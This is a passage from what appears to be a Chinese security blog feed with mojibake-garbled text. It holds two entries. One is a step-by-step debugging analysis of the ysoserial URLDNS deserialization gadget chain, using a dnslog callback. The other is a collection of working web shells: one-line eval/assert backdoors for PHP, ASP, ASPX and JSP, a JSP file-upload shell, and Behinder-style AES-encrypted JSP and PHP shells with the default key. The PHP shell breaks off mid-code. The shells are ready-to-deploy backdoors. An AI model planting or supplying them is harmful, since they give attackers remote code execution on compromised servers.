class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é“¾æ¥ï¼š<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p><h1 id="è°ƒè¯•åˆ†æ"><a class="markdownIt-Anchor" href="#è°ƒè¯•åˆ†æ">#</a> è°ƒè¯•åˆ†æ</h1><p>é¡¹ç›®é“¾æ¥ï¼š<a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></p><p>æ‰“å¼€ ideaï¼Œæ‰¾åˆ° URLDNS å…¥å£ï¼šysosertial-&gt;src-&gt;main-&gt;java-&gt;ysoserial-&gt;payloads-&gt;URLDNS.java-&gt;main ()</p><h2 id="è¿è¡Œå°è¯•"><a class="markdownIt-Anchor" href="#è¿è¡Œå°è¯•">#</a> è¿è¡Œå°è¯•</h2><p>ç›´æ¥è¿è¡Œ main å‡½æ•°ï¼Œå‘ç°é»˜è®¤ä¼ å…¥çš„å‘½ä»¤ä¸º calc.exe</p><p>æŠ¥é”™ï¼šURL åˆå§‹åŒ–å¤±è´¥ï¼Œæ‰¾ä¸åˆ° calc.exe åè®®</p><p><img src="1.png" alt=""></p><p>æœ€åä¸€è¡ŒæŠ¥é”™ä¿¡æ¯æŒ‡å‘ main å‡½æ•°ï¼Œå€’æ•°ç¬¬äºŒè¡ŒæŠ¥é”™ä¿¡æ¯æŒ‡å‘ PayloadRunner</p><p>è¯´æ˜ä¸ºä¼ å…¥å‚æ•° args æœ‰è¯¯ï¼Œåº”ä¸º URLï¼Œä¹Ÿæ˜¯æˆ‘ä»¬è¦å‘é€è¯·æ±‚çš„åœ°å€</p><p>æ‰“å¼€ dnslogï¼Œè·å–åˆ°åœ°å€ä¸ºï¼š<a href="http://ghtzjz.dnslog.cn">ghtzjz.dnslog.cn</a></p><p><img src="2.png" alt=""></p><p>ç¼–è¾‘ä¼ å…¥å‚æ•°ï¼Œ<a href="http://ghtzjz.dnslog.cn">http://ghtzjz.dnslog.cn</a></p><p><img src="3.png" alt=""></p><p><img src="4.png" alt=""></p><p>å†æ¬¡è¿è¡Œ main ()ï¼Œpayload ä¸ºæˆ‘ä»¬ä¼ å…¥çš„å‚æ•°</p><p><img src="5.png" alt=""></p><p>åˆ·æ–° dnslog çš„è¯·æ±‚è®°å½•ï¼Œå‘ç°æ¥æ”¶åˆ°äº†è¯·æ±‚ï¼Œåˆ©ç”¨æˆåŠŸ</p><p><img src="6.png" alt=""></p><h2 id="ä»£ç è°ƒè¯•"><a class="markdownIt-Anchor" href="#ä»£ç è°ƒè¯•">#</a> ä»£ç è°ƒè¯•</h2><p>æˆ‘ä»¬ä» main å‡½æ•°ä¸€æ­¥ä¸€æ­¥è°ƒè¯•ï¼Œä¼šå‘ç° URLDNS åœ¨ main ä¸­è°ƒç”¨ PayloadRunner#run ()</p><p>ç„¶å PayloadRunner#run () ä¸­è°ƒç”¨ URLDNS#getObject ()</p><p>URLDNS#getObject () ä¸­çš„ HashMap <strong>ht</strong> å°±æ˜¯æˆ‘ä»¬è¦ç”Ÿæˆçš„ï¼ˆæœªåºåˆ—åŒ–ï¼‰payload</p><p><img src="13.png" alt=""></p><p>getObeject æ–¹æ³•ä¸­ï¼Œåˆ›å»ºäº†ä¸€ä¸ª URL å¯¹è±¡ï¼ˆå­˜å‚¨æˆ‘ä»¬è¾“å…¥çš„ dns åœ°å€ï¼‰â€“&gt; å†å°† URL å¯¹è±¡æ”¾å…¥ HashMap ä¸­</p><p>ä¸‹é¢ä¸€è¡Œçš„æ³¨é‡Šå†™é“ï¼Œåœ¨ä¸Šé¢çš„ put è¿‡ç¨‹ä¸­ï¼Œè®¡ç®—å¹¶ç¼“å­˜äº† URL çš„ hashCode; è¿™å°†é‡ç½®å®ƒï¼Œä»¥ä¾¿ä¸‹æ¬¡è°ƒç”¨ hashCode æ—¶å°†è§¦å‘ DNS æŸ¥æ‰¾</p><p>é‚£ä¹ˆåœ¨ ht.put æ—¶ï¼Œæˆ‘ä»¬è¿›å…¥ HashMap æŸ¥çœ‹ï¼Œå‘ç° key è¿›è¡Œäº† hash è®¡ç®—</p><p>ï¼ˆè¿™é‡Œæ’æ’­ä¸€æ¡å°é“æ¶ˆæ¯ï¼Œç‚¹å‡»è¿™ä¸ªè°ƒè¯•å¯ä»¥è¿”å›ä¸Šä¸€æ­¥<img src="14.png" style="zoom:90%;" />)</p><p><img src="15.png" alt=""></p><p>åœ¨è¿™é‡Œå°±æ˜¯æˆ‘ä»¬çš„ URL å¯¹è±¡è¿›è¡Œäº† hash è®¡ç®—</p><p>hash è®¡ç®—å‰çš„ URL å¯¹è±¡ï¼š</p><p><img src="16.png" alt=""></p><p>hash è®¡ç®—åçš„å¯¹è±¡ï¼ˆå°±æ˜¯å¯¹è±¡ä¸­çš„ hashCode å˜é‡å‘ç”Ÿäº†å˜åŒ–å˜›ï¼‰ï¼š</p><p><img src="19.png" alt=""></p><p>è¿›å…¥ä¸‹ä¸€è¡Œä»£ç ï¼ŒReflections.setFieldValue æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p><p>çœ‹åå­—å°±æ˜¯ä¸€ä¸ªé€šè¿‡åå°„è®¾ç½®æˆå‘˜å˜é‡å€¼çš„åŠŸèƒ½ğŸ˜€</p><p>è¿›å…¥å‡½æ•°å†…éƒ¨ï¼Œæ˜¯è¦è®¾ç½®ä¼ å…¥å¯¹è±¡çš„æˆå‘˜å˜é‡ hashCode çš„å€¼</p><p><img src="17.png" alt=""></p><p>æŸ¥çœ‹å˜é‡å€¼ï¼Œä¼ å…¥å¯¹è±¡æ˜¯åŒ…å« payload çš„ URL å¯¹è±¡ï¼Œè¦å°†å®ƒçš„ hashCode å€¼è®¾ç½®ä¸º - 1</p><p><img src="18.png" alt=""></p><p>æ‰§è¡Œå®Œè¿™è¡Œä»£ç ï¼Œå‘ç°å˜é‡ u å’Œ ht ä¸­å­˜å‚¨çš„ URL å¯¹è±¡çš„ hashCode å€¼éƒ½å˜ä¸º - 1 äº†</p><p><img src="20.png" alt=""></p><p>ç„¶åè¿”å› htï¼Œä¹Ÿå°±æ˜¯æ›´æ”¹è¿‡å­˜å‚¨ key çš„ hashCode å€¼çš„ HashMap</p><p>å†æ¬¡è¿›å…¥ PalodRunner#runï¼Œè¿”å›çš„ HashMap èµ‹å€¼ç»™ objBeforeï¼Œå†å°†å…¶åºåˆ—åŒ–èµ‹å€¼ç»™ ser</p><p><img src="21.png" alt=""></p><p>Utils.releasePayload (payload, objBefore) åº”è¯¥æ˜¯é‡Šæ”¾èµ„æºçš„ä»£ç ï¼ˆä¸ç”¨åœ¨æ„ï¼Œå’Œæœ€åè¿”å›å€¼æ— å…³ï¼‰</p><p>æœ€åè¿”å› serï¼Œå³å°† ser å€¼èµ‹ç»™å˜é‡ serializedï¼Œæ‰€ä»¥ serialized å°±æ˜¯åºåˆ—åŒ–åçš„ payload</p><p><strong>ç»ˆäºï¼å¼€å§‹ååºåˆ—åŒ–è§¦å‘æ¼æ´äº†ï¼</strong></p><p>ä»è¿™é‡Œè¿›å…¥ååºåˆ—åŒ–å‡½æ•°</p><p><img src="22.png" alt=""></p><p>ä»£ç æ³¨é‡Šä¸­è¯´æ˜ï¼Œ<strong>åˆ©ç”¨é“¾ä» HashMap#readObject () è¿›å…¥ï¼Œç›´åˆ°è¿›å…¥ URL#hashCode () è§¦å‘ DNS è¯·æ±‚</strong></p><blockquote><p>Gadget Chain:</p><ul><li><pre><code>HashMap.readObject()</code></pre></li><li><pre><code>HashMap.putVal()</code></pre></li><li><pre><code>HashMap.hash()</code></pre></li><li><pre><code>URL.hashCode()</code></pre></li></ul></blockquote><p>é‚£æˆ‘ä»¬å°±ä¸€ç›´ç‚¹ç‚¹ç‚¹ç›´æ¥çœ‹è§ readObject</p><p>å¥½äº†è¿‡äº†æ²¡çœ‹è§å˜¤å˜¤å˜¤</p><p>ç›´æ¥å» Hash#readObject å¤„ä¸‹ä¸ªæ–­ç‚¹</p><p><img src="23.png" alt=""></p><p>å¾€ä¸‹ç¿»ç¿»å°±ä¼šçœ‹è§ä¸€æ®µä»£ç ï¼Œåˆçœ‹è§äº†ç†Ÿæ‚‰çš„å•è¯ï¼Œhash</p><p><img src="24.png" alt=""></p><p>æ ¹æ®åˆ©ç”¨é“¾æˆ‘ä»¬å¯çŸ¥è§¦å‘æ¼æ´çš„ hashCode () å°±åœ¨ hash () ä¸­ï¼Œæˆ‘ä»¬è¿›å…¥è¯¥å‡½æ•°</p><p><img src="25.png" alt=""></p><p>åˆ°è¾¾ URL#hashCodeï¼Œæœç„¶å…¶ä¸­æœ‰ key.hashCode ()</p><p>å› ä¸ºæˆ‘ä»¬åœ¨æ„é€  payload æ—¶å°† hashCode èµ‹å€¼ä¸º - 1ï¼Œæ‰€ä»¥ä¸ä¼šè¿›å…¥ if è€Œæ˜¯æ‰§è¡Œä¸‹é¢çš„ä»£ç </p><p>è°ƒç”¨ URLStreamHandler#hashCode</p><p><img src="26.png" alt=""></p><p>è¿›å…¥ URLStreamHandler#hashCode</p><p>æ ¹æ® p ç¥çš„æ–‡ç« æ‰€è¨€ï¼ŒgetHostAddress ä¸­æœ‰ä¸€è¡Œä»£ç </p><blockquote><p>InetAddress.getByName(host) ;</p></blockquote><p>å…¶ä½œâ½¤æ˜¯æ ¹æ®ä¸»æœºåï¼Œè·å–å…¶ IP åœ°å€ï¼Œåœ¨â½¹ç»œä¸Šå…¶å®å°±æ˜¯â¼€æ¬¡ DNS æŸ¥è¯¢ï¼Œæ•´ä¸ªè§¦å‘è¿‡ç¨‹å°±å·²ç»å®Œæˆå•¦</p><p><img src="27.png" alt=""></p><p><img src="28.png" alt=""></p><p>åé¢ç»§ç»­è·Ÿè¿›å°±æ˜¯åœ°å€çš„å…·ä½“æŸ¥è¯¢è¿‡ç¨‹äº†ï¼Œæ— äº†æ— äº†</p><p>ä¸‹å›¾æ˜¯æ¼æ´è§¦å‘çš„è°ƒç”¨æ ˆ</p><p><img src="29.png" alt=""></p><h1 id="æ€»ç»“"><a class="markdownIt-Anchor" href="#æ€»ç»“">#</a> æ€»ç»“</h1><p><strong>payload æ„é€ </strong></p><p>å°†æˆ‘ä»¬è¾“å…¥çš„ dns åœ°å€å­˜å‚¨åœ¨ URL å¯¹è±¡ä¸­ -&gt; å°† URL å¯¹è±¡ä½œä¸º key å­˜å‚¨åœ¨ HashMap ä¸­ -&gt; ç”±äºä½œä¸º key å€¼ï¼Œåœ¨ put æ—¶ä¼šè¿›è¡Œ hash è®¡ç®—ï¼Œé‚£æˆ‘ä»¬å°±é€šè¿‡åå°„æ›´æ”¹å…¶ hashCode å€¼ä¸º - 1</p><p><strong>æ¼æ´è§¦å‘</strong></p><p>ååºåˆ—åŒ– HashMap æ—¶ï¼Œä¼šè°ƒç”¨ hash () è®¡ç®— key çš„ hash å€¼ -&gt; è®¡ç®—æ—¶ï¼Œè°ƒç”¨ (URL å¯¹è±¡) key#hashCode () -&gt; ç”±äºæˆ‘ä»¬å°†è¯¥å¯¹è±¡çš„ hashCode å€¼è®¾ç½®ä¸º - 1ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨ handler.hashCode () -&gt; å…¶ä¸­è·å–åœ°å€çš„ä»£ç ï¼Œ <code> InetAddress addr = getHostAddress(u);</code>  å®é™…ä¸Šå°±æ˜¯ä¸€æ¬¡ DNS æŸ¥è¯¢</p><p><strong>å°å½©è›‹</strong></p><p>åœ¨æ„é€  payloadï¼Œht.put () æ—¶ï¼Œç”±äº URL çš„ hashCode å€¼ä¸º - 1ï¼Œæ‰€ä»¥åŒæ ·ä¼šè°ƒç”¨ handler.hashCode () è§¦å‘ DNS æŸ¥è¯¢ï¼Œå¯æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬åªèƒ½è·å–åˆ°ä¸€æ¡ dns æŸ¥è¯¢è®°å½•ï¼Œè€Œä¸æ˜¯ä¸¤æ¡å‘¢ï¼Ÿ</p><p>ç›´æ¥åœ¨ DNS æŸ¥è¯¢å¤„ä¸‹æ–­ç‚¹</p><p>ç”Ÿæˆ payload æ—¶ï¼Œè¿›å…¥ URLStreamHandler#hashCode æŸ¥çœ‹å½“å‰å˜é‡</p><p><img src="31.png" alt=""></p><p>ååºåˆ—åŒ–æ—¶ï¼Œè¿›å…¥ URLStreamHandler#hashCode æŸ¥çœ‹å½“å‰å˜é‡</p><p><img src="32.png" alt=""></p><p>å¯ä»¥å‘ç°è·å–åˆ°çš„ addr æœ‰å€¼äº†ï¼Œä¸º <code>åŸŸå/127.0.0.1</code></p><p>é‚£ä¹ˆåŒæ ·æ˜¯å°† <code>http://ysmzza.dnslog.cn</code>  ä¼ å…¥ <code>getHostAddress(u)</code>  å¾—åˆ°çš„ç»“æœå´ä¸ä¸€æ ·å‘¢ï¼Ÿ</p><p>é‚£ä¹ˆæˆ‘ä»¬å†è¿›å…¥ <code>getHostAddress(u)</code>  è¿›è¡Œå¯¹æ¯”</p><p>æ„é€  payload è¿›å…¥ <code>getHostAddress(u)</code>  æ—¶ï¼Œå¦‚ä¸‹å›¾</p><p><img src="33.png" alt=""></p><p><img src="34.png" alt=""></p><p>è¿™é‡Œè°ƒç”¨çš„ SilentURLStreamHandler#getHostAddress ç›´æ¥è¿”å›çš„ null</p><p>æ³¨é‡Š:</p><blockquote><p>è¿™ä¸ª URLStreamHandler å®ä¾‹ç”¨äºåœ¨åˆ›å»º URL å®ä¾‹æ—¶é¿å…ä»»ä½• DNS è§£æã€‚ DNS è§£æç”¨äºæ¼æ´æ£€æµ‹ã€‚é‡è¦çš„æ˜¯ä¸è¦åœ¨ä½¿ç”¨åºåˆ—åŒ–å¯¹è±¡ä¹‹å‰æ¢æµ‹ç»™å®šçš„ URLã€‚æ½œåœ¨çš„è¯¯æŠ¥ï¼šå¦‚æœé¦–å…ˆä»æµ‹è¯•è®¡ç®—æœºè§£æ DNS åç§°ï¼Œåˆ™ç›®æ ‡æœåŠ¡å™¨å¯èƒ½ä¼šè·å¾—ç¼“å­˜å‡»ä¸­ç¬¬äºŒä¸ªå†³è®®ã€‚</p></blockquote><p>è€Œåœ¨æˆ‘ä»¬ååºåˆ—åŒ–åè¿›å…¥ <code>getHostAddress(u)</code> ï¼ŒURL å¯¹è±¡ä¸­çš„ handler å°±æ˜¯é»˜è®¤çš„ handler äº†ï¼Œå› è€Œä¼šè§¦å‘ DNS æŸ¥è¯¢</p><p>æ‰€ä»¥ POC ä¸­å®šä¹‰ URLStreamHandler å†…éƒ¨ç±»ï¼Œé¿å…ç”Ÿæˆ paayload æ—¶è¿›è¡Œ DNS è§£æï¼ˆå…¶å®çœ‹æ³¨é‡Šå°±èƒ½çœ‹åˆ°ï¼Œä½†æˆ‘ä¸€å¼€æ²¡æœ‰çœ‹åˆ°è¿™é‡Œçš„ä»£ç  (à¹‘ãƒ»ÌÏ‰à¸Ì€à¹‘)  ï¼‰</p><p><strong>å°é—®é¢˜</strong></p><ol><li><p>æ¼æ´æ˜¯é€šè¿‡ URLStreamHandler#hashCode è§¦å‘çš„ï¼Œé‚£ä¹ˆè¿™ä¸ª handler æ˜¯å•¥ç©æ„ï¼Ÿ</p></li><li><p>new URL å¯¹è±¡æ—¶ï¼Œä¸€å®šè¦ä¼ å…¥ handler æ‰èƒ½è§¦å‘æ¼æ´å—ï¼Ÿå¦‚æœä¸ä¼ å…¥ handlerï¼Œç¨‹åºè¿˜èƒ½æ­£å¸¸è¿è¡Œå—ï¼Ÿï¼ˆå› ä¸º HashMap#put æ—¶ä¼šè°ƒç”¨ URLStreamHandler#hashCodeï¼‰ä¼šæœ‰é»˜è®¤çš„ handler ç»™æˆ‘ä»¬è°ƒç”¨å—ï¼Ÿ</p></li></ol><p>æŸ¥æŸ¥ API</p><blockquote><p>æŠ½è±¡ç±» <code> URLStreamHandler</code>  æ˜¯æ‰€æœ‰æµåè®®å¤„ç†ç¨‹åºçš„é€šç”¨ç±»ï¼Œæµåè®®å¤„ç†ç¨‹åºçŸ¥é“å¦‚ä½•ä¸ºç‰¹å®šåè®®ç±»å‹å»ºç«‹è¿æ¥ï¼Œå¦‚ <code>http</code>  æˆ– <code>https</code> ã€‚</p><p>åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œ  <code>URLStreamHandler</code>  å­ç±»çš„å®ä¾‹ä¸æ˜¯ç”±åº”ç”¨ç¨‹åºç›´æ¥åˆ›å»ºçš„ã€‚  æ›´ç¡®åˆ‡åœ°è¯´ï¼Œåœ¨ç¬¬ä¸€æ—¶é—´æ„å»ºæ—¶çš„åè®®åç§°é‡åˆ° <code>URL</code>  ï¼Œé€‚å½“çš„æµåè®®å¤„ç†ç¨‹åºè¢«è‡ªåŠ¨åŠ è½½ã€‚</p></blockquote><p>æ‰€ä»¥æµåè®®ç¨‹åºç”¨äºä¸ºåè®®å»ºç«‹è¿æ¥ï¼Œå¹¶æ„å»ºæ—¶çš„åè®®åç§°é‡è§ URL æ—¶ï¼Œé€‚å½“çš„æµåè®®å¤„ç†ç¨‹åºè¢«è‡ªåŠ¨åŠ è½½</p><p>æ‰€ä»¥å…¶å®ä¸ä¼ å…¥ handlerï¼ŒURL å¯¹è±¡ä¹Ÿä¼šè‡ªåŠ¨åŠ è½½ handler</p><p>ç”±å°å½©è›‹çš„å†…å®¹å¯çŸ¥ä¼ å…¥è‡ªå®šä¹‰çš„ handler åªæ˜¯ä¸ºäº†åœ¨ç”Ÿæˆ payload æ—¶ä¸è¿›è¡Œ dns è§£æ</p><h2 id="è°ƒè¯•é‡åˆ°çš„é—®é¢˜æœªè§£å†³"><a class="markdownIt-Anchor" href="#è°ƒè¯•é‡åˆ°çš„é—®é¢˜æœªè§£å†³">#</a> è°ƒè¯•é‡åˆ°çš„é—®é¢˜ï¼ˆæœªè§£å†³ï¼‰</h2><p>åœ¨å°è¯•ä»£ç è°ƒè¯•æ—¶ï¼Œå‘ç°æ— æ³•å¯ç”¨ debug</p><p><img src="7.png" alt=""></p><p>çœ‹ç¬¬ä¸€è¡Œï¼Œè¿è¡Œçš„æ˜¯ jdk8_32ï¼Œè€Œæˆ‘çš„ idea æ˜¯ 64 ä½çš„ï¼Œä¼°è®¡æ˜¯ä¸ä¸€è‡´å¯¼è‡´çš„é—®é¢˜ï¼ˆä»¥å‰ç»å¸¸ç¢°è§ tomcat å’Œ jdk ä¸ä¸€è‡´å¯¼è‡´çš„é—®é¢˜ï¼‰</p><p>åœ¨ä¸Šæ–¹èœå•æ  file-&gt;project structure ä¸­å¯ä»¥è®¾ç½® jdk ç‰ˆæœ¬ï¼Œæ›´æ”¹ä¸º 64 ä½ jdk</p><p><img src="8.png" alt=""></p><p>ç„¶åå°±ä¼šæŠ¥é”™ï¼Œç¨‹åºåŒ… sun.rmi.server ä¸å­˜åœ¨</p><p><img src="9.png" alt=""></p><p>ä½†æ˜¯åœ¨ä½¿ç”¨ jdk8 è¿è¡Œç¨‹åºæ—¶å¹¶æ²¡æœ‰è¯¥é”™è¯¯ï¼Œctrl+click ç‚¹å‡»è¿›å…¥æŠ¥é”™ç¨‹åºåŒ…ï¼Œæ˜¯å¯ä»¥æ‰¾åˆ°åœ¨ java åŸç”Ÿåº“ä¸­çš„</p><p><img src="10.png" alt=""></p><p>ä¹Ÿå°±æ˜¯è¯´åœ¨ç¼–è¯‘ç¨‹åºçš„ classpath ä¸­æ²¡æœ‰åŒ…å«â€™sun.rmi.serverâ€™è¿™ä¸ªåŒ…</p><p>æˆ‘çš„ç›´è§‰å‘Šè¯‰æˆ‘æ˜¯ç‰ˆæœ¬çš„é—®é¢˜ï¼Œå¯æ˜¯ä¸Šå›¾ä¸­ jdk11 çš„åŒ…é‡Œé¢ä¹Ÿæœ‰è¿™ä¸ªåŒ…çš„å¹¶ä¸”å·²ç»å¼•å…¥é¡¹ç›®ä¸­äº†</p><p>æ‰€ä»¥æˆ‘æ¢å› jdk8_32ï¼ŒæŸ¥çœ‹ jar åŒ…çš„åŒºåˆ«</p><p>jdk8ï¼š</p><p><img src="11.png" alt=""></p><p>jdk11:</p><p><img src="12.png" alt=""></p><p>éš¾é“è¿™ä¸ªä¸–ç•Œæœ‰äº›ä¸œè¥¿æˆ‘çœŸçš„ï¼Œéš¾ä»¥æ¢å¯»å—ï¼Œè¿™çœŸçš„å°±æ˜¯æˆ‘çš„æé™äº†å—ï¼Œä¸ï¼Œæˆ‘è¦å»ç™¾åº¦ï¼ï¼ç™¾åº¦æ•‘æˆ‘ï¼ï¼ï¼</p><p><strong><a href="https://xy2401.com/local-docs/oracle/java.zh/11/migrate/#JSMIG-GUID-D7936F0D-08A9-411E-AD2F-E14A38DA56A7">è¿™é‡Œå‘ç°</a>ï¼Œjdk11 ä¸å†æä¾› corba å·¥å…·ï¼Œrmic (RMI ç¼–è¾‘å™¨) ä¸å†æ”¯æŒ - idl æˆ– - iiop é€‰é¡¹ã€‚</strong></p><p>å¯æ˜¯ java11 çš„ api é‡Œé¢æ˜¯æœ‰ rmi çš„ğŸ™</p><p>æœç„¶æ¢æˆ jdk8_64 æ‰€æœ‰é—®é¢˜è¿åˆƒè€Œè§£ï¼Œé‚£ä¹ˆè¿™ä¸ªé—®é¢˜â€¦</p><p>å½“ç„¶ä¸èƒ½ç®—è§£å†³äº†ï¼Œæœªå®Œå¾…ç»­ï¼</p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ysoserialè°ƒè¯• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€å¥è¯æœ¨é©¬æ•´ç†</title>
      <link href="/2021/08/12/stjc/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%95%B4%E7%90%86/"/>
      <url>/2021/08/12/stjc/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="æ—¥å¸¸ç³»åˆ—"><a class="markdownIt-Anchor" href="#æ—¥å¸¸ç³»åˆ—">#</a> æ—¥å¸¸ç³»åˆ—</h1><h2 id="phtml"><a class="markdownIt-Anchor" href="#phtml">#</a> phtml</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;milkii0&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="php"><a class="markdownIt-Anchor" href="#php">#</a> php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;milkii0&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span> assert(<span class="variable">$_POST</span>[<span class="string">&#x27;milkii0&#x27;</span>]);<span class="meta">?&gt;</span> </span><br><span class="line">    </span><br><span class="line">&lt;O&gt;h=@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;milkii0&#x27;</span>]);&lt;/O&gt;</span><br></pre></td></tr></table></figure><h2 id="asp"><a class="markdownIt-Anchor" href="#asp">#</a> asp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%execute(request(&quot;milkii0&quot;))%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%execute request(&quot;milkii0&quot;)%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%eval request(&quot;milkii0&quot;)%&gt;</span><br></pre></td></tr></table></figure><h2 id="aspx"><a class="markdownIt-Anchor" href="#aspx">#</a> aspx</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot; %&gt;</span><br><span class="line">&lt;%eval(Request.Item[&quot;milkii0&quot;]);%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ Page Language=&quot;Jscript&quot; validateRequest=&quot;false&quot; %&gt;&lt;%Response.Write(eval(Request.Item[&quot;milkii0&quot;],&quot;unsafe&quot;));%&gt;</span><br></pre></td></tr></table></figure><h2 id="jsp"><a class="markdownIt-Anchor" href="#jsp">#</a> jsp</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span>(request.getParameter(<span class="string">&quot;file_name&quot;</span>)!=<span class="keyword">null</span>)(</span><br><span class="line">    <span class="keyword">new</span> java.io.FileOutputStream(application.getRealPath(<span class="string">&quot;/&quot;</span>)+request.getParameter(<span class="string">&quot;file_name&quot;</span>))).write(request.getParameter(<span class="string">&quot;file_content&quot;</span>).getBytes()</span><br><span class="line">);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h1 id="å†°èç³»åˆ—"><a class="markdownIt-Anchor" href="#å†°èç³»åˆ—">#</a> å†°èç³»åˆ—</h1><h2 id="jsp-2"><a class="markdownIt-Anchor" href="#jsp-2">#</a> jsp</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line">    U(ClassLoader c)&#123;</span><br><span class="line">        <span class="keyword">super</span>(c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span> []b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b,<span class="number">0</span>,b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;</span><br><span class="line">    String k=<span class="string">&quot;e45e329feb5d925b&quot;</span>;<span class="comment">/*è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç rebeyond*/</span></span><br><span class="line">    session.putValue(<span class="string">&quot;u&quot;</span>,k);</span><br><span class="line">    Cipher c=Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">    c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec(k.getBytes(),<span class="string">&quot;AES&quot;</span>));</span><br><span class="line">    <span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h2 id="php-2"><a class="markdownIt-Anchor" href="#php-2">#</a> php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">//è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç rebeyond</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">session_write_close();</span><br><span class="line"><span class="variable">$post</span>=file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span 